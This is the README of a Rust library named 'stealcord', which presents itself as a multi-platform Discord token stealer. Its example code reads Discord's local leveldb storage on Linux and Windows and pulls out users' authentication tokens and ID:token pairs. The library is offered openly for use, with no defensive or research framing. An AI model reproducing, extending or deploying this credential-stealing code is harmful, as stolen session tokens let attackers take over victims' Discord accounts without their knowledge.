# stealcord

Multi platform Discord token stealer library written in Rust.

## Example

```rust
// Import necessary libraries
use simple_home_dir::*;
use stealcord::{get_token, get_tokens};

fn main() {
    // Set path to Discord token storage
    let path = home_dir().unwrap().join(if cfg!(target_os = "linux") {
        // Linux
        ".config/discord/Local Storage/leveldb/"
    } else {
        // Windows
        "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
    });

    // Get only token
    if let Ok(token) = get_token(path.clone()) {
        // Print token
        println!("{token}")
    } else {
        // Print error message
        panic!("Error getting token")
    }

    // Get ID : Token
    if let Ok(tokens) = get_tokens(path.clone()) {
        // Print tokens
        println!("{tokens}")
    } else {
        // Print error message
        panic!("Error getting tokens")
    }
}
```

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.